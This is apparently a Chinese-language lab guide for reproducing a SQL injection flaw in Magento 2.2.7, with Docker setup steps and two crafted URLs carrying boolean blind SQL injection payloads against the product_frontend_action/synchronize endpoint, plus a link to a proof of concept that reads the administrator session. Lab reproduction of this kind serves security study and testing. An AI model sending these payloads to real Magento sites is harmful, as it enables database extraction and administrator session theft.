# Magento 2.2 SQL注入漏洞

## 环境搭建

执行如下命令启动Magento 2.2.7：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080，即可看到Magento的安装页面。安装Magento时，数据库地址填写mysql，账号密码均为root，其他保持默认：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780891982273-3f8e7dbb-72c0-4de4-b7ea-2d7ba18a5969.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780891982450-c9c5dc95-5b04-4e36-9c8e-a697bd432fb8.png)

## 漏洞复现

分别访问如下链接：

```plain
http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
```

可见，在执行))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -和))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -时，返回的HTTP状态码不同：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780891983103-99dce73d-48a0-41d2-b80a-6d67487a0b15.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780891982707-8ec14439-3b0b-4d6c-af82-58e8c4923e74.png)

通过改变OR的条件，即可实现SQL BOOL型盲注。利用[这个POC](https://github.com/ambionics/magento-exploits#tdsub)，可以读取管理员的session：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780891982580-a64701e7-dc6f-49cd-815f-19e40ce594d6.png)